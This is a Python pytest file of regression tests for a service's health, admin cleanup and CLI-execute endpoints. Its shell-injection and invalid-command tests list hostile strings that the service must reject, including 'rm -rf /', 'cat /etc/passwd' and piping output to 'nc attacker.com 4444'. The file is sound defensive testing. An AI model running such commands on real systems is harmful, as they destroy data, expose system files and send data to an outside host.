"""
Regression tests for Admin and CLI endpoints.

Covers:
  POST /api/admin/cleanup
  POST /api/cli/execute
  GET  /health
"""

import pytest
from httpx import AsyncClient
from unittest.mock import patch


@pytest.mark.asyncio
async def test_health_check(client: AsyncClient):
    """GET /health returns status ok."""
    resp = await client.get("/health")
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


@pytest.mark.asyncio
async def test_admin_cleanup(client: AsyncClient):
    """POST /admin/cleanup returns cleanup stats."""
    resp = await client.post("/api/admin/cleanup")
    assert resp.status_code == 200
    data = resp.json()
    assert "released_locks" in data
    assert "failed_runs" in data
    assert "deleted_locks" in data
    assert "deleted_queue_entries" in data


@pytest.mark.asyncio
async def test_cli_execute_missing_client_key(client: AsyncClient):
    """CLI execute without client_key returns 400."""
    resp = await client.post("/api/cli/execute", json={"command": "pytest tests/"})
    assert resp.status_code == 400
    assert "client_key" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_cli_execute_missing_command(client: AsyncClient, registered_client):
    """CLI execute without command returns 400."""
    resp = await client.post(
        "/api/cli/execute",
        json={"client_key": registered_client["client_key"]},
    )
    assert resp.status_code == 400
    assert "command" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_cli_execute_invalid_command(client: AsyncClient, registered_client):
    """CLI execute with a dangerous command is rejected."""
    resp = await client.post(
        "/api/cli/execute",
        json={
            "client_key": registered_client["client_key"],
            "command": "rm -rf /",
        },
    )
    assert resp.status_code == 400
    assert "Only test commands" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_cli_execute_shell_injection(client: AsyncClient, registered_client):
    """CLI execute blocks shell operators (;, &&, |, etc.)."""
    dangerous_commands = [
        "pytest; rm -rf /",
        "pytest && cat /etc/passwd",
        "pytest | nc attacker.com 4444",
        "pytest $(whoami)",
        "pytest `id`",
    ]
    for cmd in dangerous_commands:
        resp = await client.post(
            "/api/cli/execute",
            json={
                "client_key": registered_client["client_key"],
                "command": cmd,
            },
        )
        assert resp.status_code == 400, f"Expected 400 for dangerous command: {cmd}"


@pytest.mark.asyncio
async def test_cli_execute_valid_command(client: AsyncClient, registered_client):
    """CLI execute with a valid pytest command creates a run."""
    resp = await client.post(
        "/api/cli/execute",
        json={
            "client_key": registered_client["client_key"],
            "command": "pytest tests/test_dummy1.py -v",
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert "id" in data
    assert data["status"] in ("pending", "running")
    assert data["note"].startswith("CLI:")


@pytest.mark.asyncio
async def test_cli_execute_invalid_client(client: AsyncClient):
    """CLI execute with wrong client_key returns 404."""
    resp = await client.post(
        "/api/cli/execute",
        json={
            "client_key": "nonexistent-key",
            "command": "pytest tests/",
        },
    )
    assert resp.status_code == 404
